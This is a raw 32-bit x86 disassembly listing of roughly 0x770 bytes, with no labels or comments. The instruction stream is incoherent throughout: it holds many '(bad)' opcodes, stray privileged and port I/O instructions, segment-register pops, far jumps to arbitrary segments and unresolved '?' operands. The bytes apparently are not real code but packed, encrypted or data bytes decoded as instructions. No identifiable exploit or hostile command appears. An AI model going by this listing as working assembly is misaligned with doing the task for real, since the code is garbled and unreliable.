  40d0aa:	mov    ds:0xb5875195,eax
  40d0af:	jbe    0x40d10f
  40d0b1:	ja     0x40d0a7
  40d0b3:	mov    ah,BYTE PTR [edx]
  40d0b5:	mov    ds:0x8c75c152,eax
  40d0ba:	sbb    al,0xb0
  40d0bc:	jmp    0xc6069e42
  40d0c1:	shl    DWORD PTR [ecx-0x4a],1
  40d0c4:	jl     0x40d056
  40d0c6:	scas   al,BYTE PTR es:[edi]
  40d0c7:	mov    ah,0xb3
  40d0c9:	mov    edx,0xe0f1543a
  40d0ce:	(bad)  [ebp+0x1b]
  40d0d1:	outs   dx,BYTE PTR ds:[esi]
  40d0d2:	jno    0x40d098
  40d0d4:	add    al,0x9e
  40d0d6:	and    al,0x7b
  40d0d8:	sub    BYTE PTR [esi],al
  40d0da:	mov    ds:0x1dd40750,al
  40d0df:	test   DWORD PTR [ebx-0x3b],edi
  40d0e2:	push   esp
  40d0e3:	sub    DWORD PTR [edx+ebp*8],ebx
  40d0e6:	mov    dh,cl
  40d0e8:	les    esi,FWORD PTR [ebp-0x73]
  40d0eb:	or     BYTE PTR [edx],ah
  40d0ed:	xor    ecx,DWORD PTR [ecx-0x45]
  40d0f0:	popa   
  40d0f1:	out    dx,eax
  40d0f2:	mov    ds:0x34fcc064,eax
  40d0f7:	jbe    0x40d11a
  40d0f9:	jmp    0x40d138
  40d0fb:	outs   dx,BYTE PTR ds:[esi]
  40d0fc:	fild   QWORD PTR [ebx-0x6c26a8e7]
  40d102:	adc    ah,BYTE PTR [edx]
  40d104:	xchg   esi,eax
  40d105:	mov    ch,0x2b
  40d107:	or     eax,0xc400d945
  40d10c:	sub    eax,esp
  40d10e:	adc    ecx,DWORD PTR [edx-0x48142b3]
  40d114:	clc    
  40d115:	pop    edx
  40d116:	lods   al,BYTE PTR ds:[esi]
  40d117:	ret    0x30df
  40d11a:	dec    esi
  40d11b:	std    
  40d11c:	pop    ss
  40d11d:	aaa    
  40d11e:	jne    0x40d185
  40d120:	jnp    0x40d153
  40d122:	mov    ch,al
  40d124:	and    bh,BYTE PTR [esi+0x4abf2dfe]
  40d12a:	adc    al,0x20
  40d12c:	pop    eax
  40d12d:	pop    edx
  40d12e:	pusha  
  40d12f:	cdq    
  40d130:	dec    bh
  40d132:	addr16 loope 0x40d18c
  40d135:	shr    BYTE PTR [edi],1
  40d137:	jl     0x40d15d
  40d139:	aad    0x30
  40d13b:	or     BYTE PTR [ebx-0x7f],cl
  40d13e:	or     dh,BYTE PTR [ebx+eiz*1]
  40d141:	out    0x2c,eax
  40d143:	push   ebp
  40d144:	arpl   di,bp
  40d146:	or     al,0x33
  40d148:	fidiv  DWORD PTR [ecx+0x2b]
  40d14b:	pop    edi
  40d14c:	fs xchg ebp,eax
  40d14e:	lods   al,BYTE PTR ds:[esi]
  40d14f:	imul   ebp,DWORD PTR [edx],0x7bc000ae
  40d155:	fstp   st(4)
  40d157:	jg     0x40d15e
  40d159:	push   ds
  40d15a:	inc    esp
  40d15b:	ins    BYTE PTR es:[edi],dx
  40d15c:	add    DWORD PTR [ebp-0x71],edx
  40d15f:	inc    esi
  40d160:	stc    
  40d161:	cmp    DWORD PTR [edi-0x32a85445],0x5a
  40d168:	cmp    esi,DWORD PTR [edx-0x4c]
  40d16b:	xchg   ebx,eax
  40d16c:	call   0x283e:0x694f596c
  40d173:	cmc    
  40d174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d175:	mov    edx,DWORD PTR [ebp-0x6ae844d9]
  40d17b:	lds    ebx,FWORD PTR [ecx-0x5d]
  40d17e:	cmp    dh,BYTE PTR [edi+ebx*1]
  40d181:	add    eax,0x1675bc3e
  40d186:	jmp    0x5796:0xbfb62dd5
  40d18d:	inc    ecx
  40d18e:	and    DWORD PTR [ebp+0x3c],eax
  40d191:	aas    
  40d192:	adc    ah,al
  40d194:	jo     0x40d1a0
  40d196:	cld    
  40d197:	dec    ebx
  40d198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d199:	retf   
  40d19a:	mov    esi,0x7be16364
  40d19f:	shl    BYTE PTR [ebx],cl
  40d1a1:	test   DWORD PTR [ebx+edx*1+0x661d0223],esi
  40d1a8:	xchg   ebx,eax
  40d1a9:	push   eax
  40d1aa:	call   0x98c6:0x4308745e
  40d1b1:	dec    edi
  40d1b2:	repz adc BYTE PTR [ebx],bh
  40d1b5:	retf   
  40d1b6:	xor    ebx,DWORD PTR [edi-0x47c3972]
  40d1bc:	xor    al,0xcb
  40d1be:	ror    BYTE PTR [ecx+0x77],0x11
  40d1c2:	pop    ss
  40d1c3:	ins    BYTE PTR es:[edi],dx
  40d1c4:	cdq    
  40d1c5:	xor    eax,0xced11b9c
  40d1ca:	mov    BYTE PTR [ebp-0x374cf055],cl
  40d1d0:	sub    ebx,DWORD PTR [esp+esi*1+0x1a5811ec]
  40d1d7:	mov    al,ds:0x50189214
  40d1dc:	pop    ds
  40d1dd:	pcmpgtb mm1,QWORD PTR [esi+eiz*1+0xef8fc7f]
  40d1e5:	mov    eax,0x508eeb88
  40d1ea:	adc    BYTE PTR [ecx+0x48e16b2c],al
  40d1f0:	ror    BYTE PTR [edi+ebp*1+0x90e7ae3],cl
  40d1f7:	loope  0x40d179
  40d1f9:	lods   eax,DWORD PTR ds:[esi]
  40d1fa:	and    ebx,ebx
  40d1fc:	test   BYTE PTR [edi],bl
  40d1fe:	cmp    al,0xeb
  40d200:	inc    BYTE PTR [edx]
  40d202:	and    BYTE PTR [bp+di-0x52],dh
  40d206:	inc    edi
  40d207:	(bad)  
  40d208:	mov    eax,ds:0x669fe3e7
  40d20d:	sub    al,0xc
  40d20f:	out    dx,eax
  40d210:	sbb    eax,0xc8850956
  40d215:	out    0xf2,al
  40d217:	mov    dh,0x7d
  40d219:	je     0x40d20e
  40d21b:	cdq    
  40d21c:	iret   
  40d21d:	fstp   QWORD PTR [eax+0x1a]
  40d220:	(bad)  
  40d221:	mov    bl,BYTE PTR [esi+0x3a62467b]
  40d227:	add    eax,0x2c106043
  40d22c:	fsubr  DWORD PTR [eax-0x24e93424]
  40d232:	shr    edx,1
  40d234:	jge    0x40d2b0
  40d236:	jle    0x40d23a
  40d238:	shl    DWORD PTR cs:[ebp+0x38e3cdc5],cl
  40d23f:	popa   
  40d240:	add    BYTE PTR [esi+0x4e5eb2d8],cl
  40d246:	aas    
  40d247:	sub    eax,0x195598e0
  40d24c:	int3   
  40d24d:	lahf   
  40d24e:	mov    eax,DWORD PTR [ecx-0x4c]
  40d251:	mov    eax,0x48ae9a17
  40d256:	adc    BYTE PTR [ecx],ah
  40d258:	ror    BYTE PTR [esi+0x1c],cl
  40d25b:	adc    ecx,eax
  40d25d:	loope  0x40d2af
  40d25f:	xchg   ecx,eax
  40d260:	cmp    DWORD PTR [edi+eax*8+0x243396bb],edx
  40d267:	lds    edx,FWORD PTR [esi]
  40d269:	pop    esp
  40d26a:	loope  0x40d21a
  40d26c:	pop    ds
  40d26d:	jns    0x40d220
  40d26f:	mov    DWORD PTR [ecx],0xe39d3e05
  40d275:	into   
  40d276:	(bad)  
  40d277:	mov    cl,0x75
  40d279:	fwait
  40d27a:	dec    esi
  40d27b:	mov    edi,0x80d4e1f5
  40d280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d281:	retf   
  40d282:	jne    0x40d279
  40d284:	lock mov eax,0xd107c0d1
  40d28a:	xlat   BYTE PTR ds:[ebx]
  40d28b:	adc    BYTE PTR [ebx-0x2a7a6c60],al
  40d291:	xor    ch,al
  40d293:	sbb    DWORD PTR [ebx-0x7],edx
  40d296:	sbb    ecx,DWORD PTR [ecx]
  40d298:	imul   edi,DWORD PTR [edx],0x67
  40d29b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d29c:	sti    
  40d29d:	mov    edx,0xe24c9964
  40d2a2:	xchg   DWORD PTR [esi],ecx
  40d2a4:	inc    esp
  40d2a5:	pop    ss
  40d2a6:	add    BYTE PTR [eax],bl
  40d2a8:	addr16 jb 0x40d26d
  40d2ab:	xchg   esp,eax
  40d2ac:	add    al,0xd5
  40d2ae:	adc    BYTE PTR [esi-0x32],0xe4
  40d2b2:	mov    bh,0x43
  40d2b4:	sbb    DWORD PTR ds:0x4b4500da,eax
  40d2ba:	icebp  
  40d2bb:	lods   al,BYTE PTR ds:[esi]
  40d2bc:	sub    ch,BYTE PTR [eax-0x54]
  40d2bf:	push   ecx
  40d2c0:	push   ds
  40d2c1:	add    bh,BYTE PTR [edx]
  40d2c3:	(bad)
  40d2c6:	inc    ebx
  40d2c7:	outs   dx,BYTE PTR ds:[esi]
  40d2c8:	sbb    ah,BYTE PTR [esi+0x6fcc27fc]
  40d2ce:	or     BYTE PTR [ebx],0x1f
  40d2d1:	fst    DWORD PTR [ebp+ebp*4+0x33]
  40d2d5:	jmp    0x912f:0x3f751378
  40d2dc:	and    BYTE PTR ds:0x5ea57d84,ch
  40d2e2:	daa    
  40d2e3:	xchg   esp,eax
  40d2e4:	nop
  40d2e5:	pushf  
  40d2e6:	not    DWORD PTR [ebp+0x502b1aaa]
  40d2ec:	xchg   DWORD PTR [ecx-0x74],edx
  40d2ef:	gs sub ah,dh
  40d2f2:	jae    0x40d371
  40d2f4:	or     BYTE PTR gs:[esi+0x2],al
  40d2f8:	mov    bl,0x15
  40d2fa:	fadd   DWORD PTR [edx-0x24]
  40d2fd:	sub    BYTE PTR [eax],ah
  40d2ff:	push   esp
  40d300:	mov    ebp,0x48f9089b
  40d305:	and    DWORD PTR [edx+0x9db97b9],esp
  40d30b:	pop    esi
  40d30c:	adc    esi,0x54
  40d30f:	lahf   
  40d310:	shr    al,cl
  40d312:	je     0x40d299
  40d314:	aam    0x4
  40d316:	add    bl,BYTE PTR [di]
  40d319:	bound  edi,QWORD PTR [ebx-0x64]
  40d31c:	xor    bh,al
  40d31e:	stc    
  40d31f:	mov    eax,0x244bb533
  40d324:	int3   
  40d325:	repz xor bl,ah
  40d328:	pushf  
  40d329:	or     DWORD PTR [esi+0x73],edx
  40d32c:	fisttp DWORD PTR [ebp+0x6a539252]
  40d332:	adc    cl,BYTE PTR [esi]
  40d334:	out    0x1a,al
  40d336:	sbb    DWORD PTR [eax-0x512d540a],0xc92fe635
  40d340:	cmc    
  40d341:	(bad)  
  40d342:	pop    esp
  40d343:	in     al,dx
  40d344:	jmp    0x30539fe2
  40d349:	clc    
  40d34a:	lock nop
  40d34c:	xlat   BYTE PTR ds:[ebx]
  40d34d:	mov    ds,esi
  40d34f:	icebp  
  40d350:	ror    DWORD PTR [edx+0x2aee5e15],0xd6
  40d357:	retf   0x9e76
  40d35a:	stc    
  40d35b:	and    eax,0x81551af4
  40d360:	jecxz  0x40d32d
  40d362:	dec    ebx
  40d363:	stos   BYTE PTR es:[edi],al
  40d364:	adc    BYTE PTR [edi],al
  40d366:	mov    esp,0x9d6165d9
  40d36b:	xor    edi,DWORD PTR [edi+0x48]
  40d36e:	cmp    DWORD PTR [ebx+0xd],edx
  40d371:	jmp    0x71f9:0xe7f9b397
  40d378:	sub    al,0xca
  40d37a:	cdq    
  40d37b:	clc    
  40d37c:	(bad)  
  40d37d:	outs   dx,BYTE PTR ds:[esi]
  40d37e:	je     0x40d3fe
  40d380:	cmp    dl,BYTE PTR [ebp+0x72]
  40d383:	bound  esp,QWORD PTR [edx-0x4c]
  40d386:	(bad)  
  40d387:	mov    edi,0x86eac66e
  40d38c:	xor    dl,bl
  40d38e:	pop    esp
  40d38f:	pop    ebx
  40d390:	test   eax,0x2cc16c60
  40d396:	dec    ebx
  40d397:	mov    edi,0x857635af
  40d39c:	or     esi,0xffffffd8
  40d39f:	cmp    bl,BYTE PTR [ebx-0x76]
  40d3a2:	loopne 0x40d34c
  40d3a4:	stos   DWORD PTR es:[edi],eax
  40d3a5:	adc    esi,esi
  40d3a7:	inc    eax
  40d3a8:	lock repnz xor al,0x2b
  40d3ac:	dec    eax
  40d3ad:	in     al,dx
  40d3ae:	cmp    al,0x29
  40d3b0:	int3   
  40d3b1:	inc    ebx
  40d3b2:	aam    0x51
  40d3b4:	push   ss
  40d3b5:	jmp    0x39bf77f1
  40d3ba:	sbb    BYTE PTR [edx+0x7eafd0a5],bh
  40d3c0:	mov    eax,ds:0x5a66860a
  40d3c5:	pop    ebx
  40d3c6:	ret    
  40d3c7:	(bad)  
  40d3c8:	loopne 0x40d35d
  40d3ca:	gs (bad) 
  40d3cd:	jp     0x40d432
  40d3cf:	dec    eax
  40d3d0:	inc    ebp
  40d3d1:	pop    ss
  40d3d2:	cwde   
  40d3d3:	and    esp,esi
  40d3d5:	int3   
  40d3d6:	out    dx,al
  40d3d7:	push   cs
  40d3d8:	fsubr  st(1),st
  40d3da:	cmp    ecx,DWORD PTR [edi]
  40d3dc:	mov    ecx,0x4a58cda2
  40d3e1:	mov    eax,0x18929458
  40d3e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3e7:	sbb    DWORD PTR [ecx],0xffffffca
  40d3ea:	int    0x32
  40d3ec:	neg    BYTE PTR [edx]
  40d3ee:	push   ebp
  40d3ef:	push   ss
  40d3f0:	and    eax,0x3e159df5
  40d3f5:	and    al,0x72
  40d3f7:	ror    BYTE PTR [ecx+0xb716fd0],0xeb
  40d3fe:	popa   
  40d3ff:	or     esi,ebp
  40d401:	mov    bh,0x22
  40d403:	cld    
  40d404:	cld    
  40d405:	shl    ecx,cl
  40d407:	add    al,0x34
  40d409:	xchg   ah,ch
  40d40b:	lahf   
  40d40c:	jge    0x40d3a2
  40d40e:	adc    ebp,DWORD PTR [ecx]
  40d410:	and    DWORD PTR [ebp-0x7df867fb],eax
  40d416:	adc    eax,0xea847ed2
  40d41c:	jns    0x40d488
  40d41e:	and    bh,BYTE PTR [esi+0x1aed0105]
  40d424:	sub    al,0xe2
  40d426:	lods   al,BYTE PTR ds:[esi]
  40d427:	cmc    
  40d428:	jnp    0x40d3e7
  40d42a:	xchg   ebx,eax
  40d42b:	(bad)  
  40d42c:	or     DWORD PTR ds:0xfa4ac814,eax
  40d432:	int    0xc2
  40d434:	push   0x4f
  40d436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d437:	push   es
  40d438:	fisub  WORD PTR ds:0xe100e91b
  40d43e:	ja     0x40d43e
  40d440:	push   esp
  40d441:	addr16 xchg ecx,eax
  40d443:	mov    ch,0x67
  40d445:	ret    0x5379
  40d448:	std    
  40d449:	adc    ecx,DWORD PTR [eax+ebp*2+0x2b]
  40d44d:	out    dx,eax
  40d44e:	mov    esp,0x2f8ab076
  40d453:	xor    al,0x2d
  40d455:	cmp    BYTE PTR [ebx-0x2d],0x9f
  40d459:	xor    cl,dl
  40d45b:	mov    ds:0x6f341df,eax
  40d460:	rcr    DWORD PTR [edx+ebx*8+0x18],cl
  40d464:	jno    0x40d404
  40d466:	jns    0x40d48f
  40d468:	jmp    0x63ca:0xe86bd465
  40d46f:	adc    BYTE PTR [ebp-0x6249f227],bl
  40d475:	and    ebp,DWORD PTR [eax+0x3dea8646]
  40d47b:	sub    eax,0x3052533
  40d480:	and    al,0x5b
  40d482:	pop    edx
  40d483:	stos   BYTE PTR es:[edi],al
  40d484:	imul   edx,DWORD PTR cs:[edx-0x261d2ae5],0xd72f9de8
  40d48f:	add    al,0xa9
  40d491:	mov    bl,0xf
  40d493:	sbb    eax,DWORD PTR [edi-0x29]
  40d496:	dec    esp
  40d497:	mov    edi,0x3c61e8c4
  40d49c:	fisub  DWORD PTR [edx-0x6152216d]
  40d4a2:	jge    0x40d4b4
  40d4a4:	adc    al,0xdf
  40d4a6:	inc    ebx
  40d4a7:	mov    ds:0xf2460438,al
  40d4ac:	iret   
  40d4ad:	imul   esi,DWORD PTR [edi-0x3a287191],0xfffffff5
  40d4b4:	sub    eax,0xe8368cf8
  40d4b9:	adc    eax,0xa29b526f
  40d4be:	mov    bh,0x42
  40d4c0:	inc    esp
  40d4c1:	push   cs
  40d4c2:	jb     0x40d4ad
  40d4c4:	outs   dx,BYTE PTR ds:[esi]
  40d4c5:	jbe    0x40d4a6
  40d4c7:	pusha  
  40d4c8:	jb     0x40d4e7
  40d4ca:	aaa    
  40d4cb:	xor    BYTE PTR [eax-0x615269f9],dh
  40d4d1:	mov    edi,0x993c7b9b
  40d4d6:	test   DWORD PTR [edx-0x59],ecx
  40d4d9:	rcr    DWORD PTR [edi+0x7a6022c8],cl
  40d4df:	mov    ah,cl
  40d4e1:	mov    ch,BYTE PTR [ebx]
  40d4e3:	aaa    
  40d4e4:	sar    al,cl
  40d4e6:	inc    esp
  40d4e7:	cmp    DWORD PTR [edi],esi
  40d4e9:	imul   edi,ecx,0x2d
  40d4ec:	rcr    esp,0x22
  40d4ef:	scas   al,BYTE PTR es:[edi]
  40d4f0:	xchg   BYTE PTR [ebp+0x43],ch
  40d4f3:	scas   al,BYTE PTR es:[edi]
  40d4f4:	sbb    bl,BYTE PTR [ebp+ebx*4+0x17]
  40d4f8:	clc    
  40d4f9:	popa   
  40d4fa:	outs   dx,DWORD PTR ds:[esi]
  40d4fb:	mov    bl,0xb8
  40d4fd:	xchg   esp,eax
  40d4fe:	adc    eax,0xfb9024b8
  40d503:	mov    eax,0x5e9a0184
  40d508:	test   eax,0x3aaf9f09
  40d50d:	xor    ebp,0x16b13206
  40d513:	add    DWORD PTR [eax+0x764f31cd],0xffffffea
  40d51a:	dec    esi
  40d51b:	mov    bh,BYTE PTR [ebp-0x69]
  40d51e:	push   ds
  40d51f:	jl     0x40d576
  40d521:	icebp  
  40d522:	jo     0x40d579
  40d524:	jle    0x40d4f6
  40d526:	imul   esp,edx,0xb2d7b91c
  40d52c:	xchg   edx,eax
  40d52d:	stc    
  40d52e:	sub    al,0xf2
  40d530:	cmp    bh,cl
  40d532:	sub    DWORD PTR [esi+0x74],esi
  40d535:	sahf   
  40d536:	inc    esi
  40d537:	out    0x2,eax
  40d539:	jmp    0x5fe4:0xb49b7244
  40d540:	push   es
  40d541:	data16 loop 0x40d52f
  40d544:	je     0x40d586
  40d546:	cmp    DWORD PTR ds:0x4066a39f,0xffffff8d
  40d54d:	pop    ecx
  40d54e:	(bad)  
  40d54f:	int    0x96
  40d551:	mov    ecx,0x7de75302
  40d556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d557:	and    BYTE PTR [ecx+eiz*4],al
  40d55a:	mov    al,ds:0x9e4bf111
  40d55f:	pop    esi
  40d560:	xor    DWORD PTR [ebx+0x7b],0x3dec7143
  40d567:	icebp  
  40d568:	inc    edx
  40d569:	jo     0x40d583
  40d56b:	rol    cl,1
  40d56d:	mov    ds:0xce44e298,eax
  40d572:	rcr    edi,cl
  40d574:	mov    ecx,0xaf24a027
  40d579:	arpl   WORD PTR [ecx-0x67],bx
  40d57c:	pushf  
  40d57d:	mov    ebx,0x21302f5a
  40d582:	fisub  DWORD PTR [ebp-0x3c972c7]
  40d588:	pop    es
  40d589:	retf   0x47d
  40d58c:	loope  0x40d512
  40d58e:	and    ecx,DWORD PTR [esi+0x73ba7c80]
  40d594:	jae    0x40d541
  40d596:	xor    eax,0x914f80a2
  40d59b:	(bad)  
  40d59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d59e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d59f:	aas    
  40d5a0:	push   ebp
  40d5a1:	cs repz mov dl,0x88
  40d5a5:	ins    BYTE PTR es:[edi],dx
  40d5a6:	ss iret 
  40d5a8:	repnz mov ch,0xea
  40d5ab:	pop    ecx
  40d5ac:	out    0x0,eax
  40d5ae:	bound  ebx,QWORD PTR [ebx]
  40d5b0:	or     dh,BYTE PTR [ecx]
  40d5b2:	(bad)
  40d5b5:	repz jne 0x40d5bd
  40d5b8:	jne    0x40d613
  40d5ba:	imul   eax,DWORD PTR [ecx+0x8],0xc00ec5ef
  40d5c1:	dec    esp
  40d5c2:	xor    edx,edi
  40d5c4:	xor    al,0x32
  40d5c6:	mov    bh,0x2e
  40d5c8:	arpl   bp,cx
  40d5ca:	cmp    cl,BYTE PTR [edi+0x72]
  40d5cd:	std    
  40d5ce:	jmp    0xcd1c:0x10c075c6
  40d5d5:	jecxz  0x40d5cd
  40d5d7:	push   edi
  40d5d8:	mov    al,0x1e
  40d5da:	test   al,0x4a
  40d5dc:	fld    QWORD PTR [ebx+0x6409155d]
  40d5e2:	mov    ch,BYTE PTR [esi]
  40d5e4:	and    al,0xac
  40d5e6:	dec    edx
  40d5e7:	std    
  40d5e8:	cmp    BYTE PTR [ebx-0x2c],ah
  40d5eb:	int    0xe5
  40d5ed:	ins    BYTE PTR es:[edi],dx
  40d5ee:	push   esi
  40d5ef:	in     al,dx
  40d5f0:	lods   eax,DWORD PTR ds:[esi]
  40d5f1:	mov    edi,0x3093252
  40d5f6:	cli    
  40d5f7:	push   0x23
  40d5f9:	push   esi
  40d5fa:	not    BYTE PTR [esi+eax*8]
  40d5fd:	(bad)  
  40d5fe:	and    al,0xdc
  40d600:	cdq    
  40d601:	(bad)  
  40d603:	leave  
  40d604:	cld    
  40d605:	sbb    edx,DWORD PTR [edx]
  40d607:	and    al,0xfa
  40d609:	cmp    eax,0x566a3aca
  40d60e:	mov    DWORD PTR [ebx],eax
  40d610:	call   0xa0e6fe52
  40d615:	mov    ?,WORD PTR [ecx+ebx*8+0x664e1354]
  40d61c:	pop    es
  40d61d:	dec    BYTE PTR [esi]
  40d61f:	push   ebp
  40d620:	js     0x40d623
  40d622:	cli    
  40d623:	(bad)  
  40d624:	aaa    
  40d625:	ds push eax
  40d627:	dec    ebp
  40d628:	ds js  0x40d5d1
  40d62b:	mov    edi,?
  40d62d:	es (bad) ds:[ecx+0x14]
  40d632:	pop    ebx
  40d633:	ins    BYTE PTR es:[edi],dx
  40d634:	outs   dx,BYTE PTR ds:[esi]
  40d635:	fistp  DWORD PTR [ecx]
  40d637:	xchg   esi,eax
  40d638:	aam    0x69
  40d63a:	in     eax,dx
  40d63b:	mov    ch,0x61
  40d63d:	jge    0x40d698
  40d63f:	or     DWORD PTR [ebp-0x80],edi
  40d642:	xor    al,0x60
  40d644:	stos   DWORD PTR es:[edi],eax
  40d645:	xchg   esp,eax
  40d646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d647:	sub    ah,al
  40d649:	js     0x40d63d
  40d64b:	cli    
  40d64c:	dec    ecx
  40d64d:	imul   esi,DWORD PTR [ebp-0x5c7ae18c],0xffffffa2
  40d654:	push   ecx
  40d655:	call   0xba31:0xed4f6ac0
  40d65c:	sub    BYTE PTR [esi],dl
  40d65e:	mov    ah,0x44
  40d660:	scas   al,BYTE PTR es:[edi]
  40d661:	sbb    al,0xe8
  40d663:	fcom   QWORD PTR [ebx]
  40d665:	sbb    edx,DWORD PTR [ebp+0x4eede221]
  40d66b:	outs   dx,DWORD PTR ds:[esi]
  40d66c:	dec    ecx
  40d66d:	pop    esi
  40d66e:	inc    edx
  40d66f:	mov    esi,0x18e44c75
  40d674:	sub    bh,BYTE PTR [ecx+0xc]
  40d677:	or     ecx,edx
  40d679:	inc    BYTE PTR [ebx-0x36]
  40d67c:	std    
  40d67d:	and    ah,BYTE PTR [ebp-0x6f15ac6f]
  40d683:	pop    esp
  40d684:	xchg   edi,eax
  40d685:	in     eax,dx
  40d686:	mov    al,BYTE PTR [edx+0x65]
  40d689:	inc    ebx
  40d68a:	jle    0x40d6a4
  40d68c:	out    0x76,eax
  40d68e:	inc    edi
  40d68f:	add    ch,0x22
  40d692:	test   eax,0x13b808fe
  40d697:	idiv   BYTE PTR [edx]
  40d699:	cld    
  40d69a:	stos   BYTE PTR es:[edi],al
  40d69b:	stos   DWORD PTR es:[edi],eax
  40d69c:	pop    esi
  40d69d:	lods   al,BYTE PTR gs:[esi]
  40d69f:	push   0x199db371
  40d6a4:	mov    ah,0xf4
  40d6a6:	les    edx,FWORD PTR [eax]
  40d6a8:	test   dh,bh
  40d6aa:	inc    edx
  40d6ab:	bound  edx,QWORD PTR [ecx+0x6]
  40d6ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6af:	or     BYTE PTR [edx],dl
  40d6b1:	mov    ds:0x82e4f637,al
  40d6b6:	dec    eax
  40d6b7:	mov    ebp,cs
  40d6b9:	call   0x8fc0133a
  40d6be:	mov    al,0xf9
  40d6c0:	sbb    BYTE PTR [edx+eax*2+0x75],bh
  40d6c4:	sbb    BYTE PTR ds:0x759f9a48,dh
  40d6ca:	push   0xffffffdd
  40d6cc:	pop    ecx
  40d6cd:	shr    eax,cl
  40d6cf:	test   al,0x4b
  40d6d1:	sub    eax,edi
  40d6d3:	ret    0xaf62
  40d6d6:	inc    edx
  40d6d7:	pop    esi
  40d6d8:	ss pop ebp
  40d6da:	mov    ds:0xb7d2f326,eax
  40d6df:	ss jl  0x40d665
  40d6e2:	push   ss
  40d6e3:	xlat   BYTE PTR ds:[ebx]
  40d6e4:	int    0x6e
  40d6e6:	(bad)  
  40d6e7:	in     eax,0xf
  40d6e9:	cmp    esp,esp
  40d6eb:	mov    ds:0x747bf3f0,eax
  40d6f0:	jns    0x40d75e
  40d6f2:	ret    0x1bd5
  40d6f5:	sub    esi,DWORD PTR gs:[edi]
  40d6f8:	adc    BYTE PTR [eax+eax*4-0x3ce1c9e1],0x2d
  40d700:	and    al,0xdd
  40d702:	nop
  40d703:	xor    ecx,eax
  40d705:	jbe    0x40d6aa
  40d707:	dec    esi
  40d708:	call   0x8a8f9be1
  40d70d:	shl    DWORD PTR [edi],cl
  40d70f:	mov    al,0xaf
  40d711:	retf   
  40d712:	mov    eax,fs:0x8d19d1cf
  40d718:	push   ds
  40d719:	out    dx,eax
  40d71a:	pop    esp
  40d71b:	add    DWORD PTR [ebp*8+0x5c2129a2],edx
  40d722:	mov    bh,0x99
  40d724:	and    eax,ebx
  40d726:	call   0x1d7438b
  40d72b:	adc    esi,edi
  40d72d:	(bad)  
  40d72e:	ja     0x40d787
  40d730:	in     al,dx
  40d731:	loop   0x40d73f
  40d733:	add    dl,bh
  40d735:	mov    ecx,0x2365e664
  40d73a:	ficomp WORD PTR [ecx]
  40d73c:	(bad)  
  40d73d:	scas   eax,DWORD PTR es:[edi]
  40d73e:	lods   al,BYTE PTR ds:[esi]
  40d73f:	cmp    eax,ebp
  40d741:	rep ins BYTE PTR es:[edi],dx
  40d743:	pop    edi
  40d744:	fiadd  DWORD PTR [ecx+0x5c52821c]
  40d74a:	pop    ebx
  40d74b:	or     bl,BYTE PTR [edx+0x3b]
  40d74e:	pop    edx
  40d74f:	stos   DWORD PTR es:[edi],eax
  40d750:	push   eax
  40d751:	js     0x40d6df
  40d753:	ss fistp WORD PTR ds:[eax]
  40d757:	add    DWORD PTR [edi],ebp
  40d759:	jmp    0x40d7d0
  40d75b:	dec    esp
  40d75c:	and    al,0x36
  40d75e:	xchg   ecx,eax
  40d75f:	paddsw mm5,QWORD PTR [eax-0x4219fc2b]
  40d766:	pop    edi
  40d767:	loope  0x40d722
  40d769:	imul   edx,DWORD PTR [ebx-0x4d8388be],0xdb95d507
  40d773:	pop    ebp
  40d774:	fmul   QWORD PTR [edi-0x7c9c7432]
  40d77a:	pop    ds
  40d77b:	ins    BYTE PTR es:[edi],dx
  40d77c:	jmp    0x1ae3706f
  40d781:	inc    ebp
  40d782:	sahf   
  40d783:	ror    DWORD PTR ds:[ecx-0x52b3430e],0x21
  40d78b:	jg     0x40d746
  40d78d:	fsub   st(4),st
  40d78f:	outs   dx,DWORD PTR ds:[esi]
  40d790:	jl     0x40d7ed
  40d792:	aam    0x5f
  40d794:	clc    
  40d795:	xchg   esp,eax
  40d796:	mov    edx,0x6340f6bc
  40d79b:	lods   eax,DWORD PTR ds:[esi]
  40d79c:	push   0xed23e9d0
  40d7a1:	push   es
  40d7a2:	jg     0x40d727
  40d7a4:	jmp    0x71cc29c0
  40d7a9:	push   ss
  40d7aa:	pop    edi
  40d7ab:	stc    
  40d7ac:	sbb    al,0xd2
  40d7ae:	pop    ss
  40d7af:	addr16 mov ds:0x9358,al
  40d7b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7b4:	sahf   
  40d7b5:	retf   0x741
  40d7b8:	scas   eax,DWORD PTR es:[edi]
  40d7b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ba:	es xchg edx,eax
  40d7bc:	add    eax,DWORD PTR [edi-0x180371dc]
  40d7c2:	sahf   
  40d7c3:	mov    cl,0x72
  40d7c5:	xor    DWORD PTR [ebp-0x67a2a18e],0x81d95d98
  40d7cf:	cmp    ebp,eax
  40d7d1:	sbb    ecx,ebx
  40d7d3:	imul   BYTE PTR [ebx-0x5c]
  40d7d6:	pop    edx
  40d7d7:	test   eax,0x7ba57787
  40d7dc:	das    
  40d7dd:	mov    ch,BYTE PTR [ecx-0x6bc08f11]
  40d7e3:	daa    
  40d7e4:	test   al,0x35
  40d7e6:	jmp    0x40d860
  40d7e8:	mov    al,BYTE PTR [edi]
  40d7ea:	stos   BYTE PTR es:[edi],al
  40d7eb:	and    cl,bl
  40d7ed:	ja     0x40d860
  40d7ef:	mov    edi,0xb68e50a2
  40d7f4:	push   es
  40d7f5:	(bad)  
  40d7f7:	(bad)  
  40d7f8:	cs stos DWORD PTR es:[edi],eax
  40d7fa:	xchg   esi,eax
  40d7fb:	and    BYTE PTR [esi+0x492e3f60],bl
  40d801:	lea    esi,[ebp+0x40]
  40d804:	int    0xe6
  40d806:	sbb    bl,BYTE PTR [edi-0x64be6cb7]
  40d80c:	inc    esi
  40d80d:	std    
  40d80e:	and    al,cl
  40d810:	not    DWORD PTR [ebx-0x6292e1e7]
  40d816:	sar    BYTE PTR ss:[edi],cl
